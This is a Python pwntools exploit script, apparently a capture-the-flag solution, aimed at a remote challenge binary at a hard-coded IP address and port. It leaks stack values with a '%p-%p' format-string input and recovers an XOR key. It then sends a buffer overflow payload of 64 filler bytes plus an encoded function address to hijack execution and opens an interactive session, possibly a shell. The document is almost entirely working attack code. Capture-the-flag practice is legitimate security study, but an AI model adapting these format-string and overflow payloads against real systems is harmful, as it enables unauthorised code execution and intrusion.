#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"

elf = ELF("./chall")
p = remote("143.110.186.64", 32777)

def send_choice(choice):
    p.sendlineafter(b"Choice: ", str(choice).encode())

send_choice(5)

p.recvuntil(b"decoy command:")
p.sendline(b"%p-%p")

output = p.recvuntil(b"Choice: ", drop=True)
log.info("Leaked output:\n" + output.decode(errors="ignore"))

lines = output.strip().split(b"\n")
for line in lines:
    if b"0x" in line and b"-" in line:
        leak_line = line.strip()
        break
else:
    log.failure("Could not find leak line with addresses")
    p.close()
    exit(1)

log.info("Leaked line: " + leak_line.decode())
parts = leak_line.split(b"-")

if len(parts) < 2:
    log.failure("Not enough parts leaked")
    p.close()
    exit(1)

expected_val1 = 0xdeadbeef ^ 0x12345678
leaked_val1 = int(parts[0], 16)

if leaked_val1 != expected_val1:
    log.failure("First leaked value mismatch")
    p.close()
    exit(1)

global_key_leak = int(parts[1], 16) ^ 0x87654321
log.success("Recovered global_key: " + hex(global_key_leak))

p.sendline(b"1")
p.sendline(b"0")

send_choice(2)
p.sendline(b"0")
p.recvuntil(b"Enter chaos data:")

win_addr = elf.symbols['_FN11111111']
log.info("win() address: " + hex(win_addr))

win_enc = p64(win_addr ^ global_key_leak)
payload = b"A" * 64 + win_enc
p.sendline(payload)

send_choice(4)
p.sendline(b"0")

try:
    response = p.recv(timeout=5)
    print("\n[+] Output after execution:")
    print(response.decode(errors="ignore"))
except EOFError:
    log.warning("No response, maybe shell is open. Switching to interactive mode.")
    p.interactive()


# Interact
p.interactive()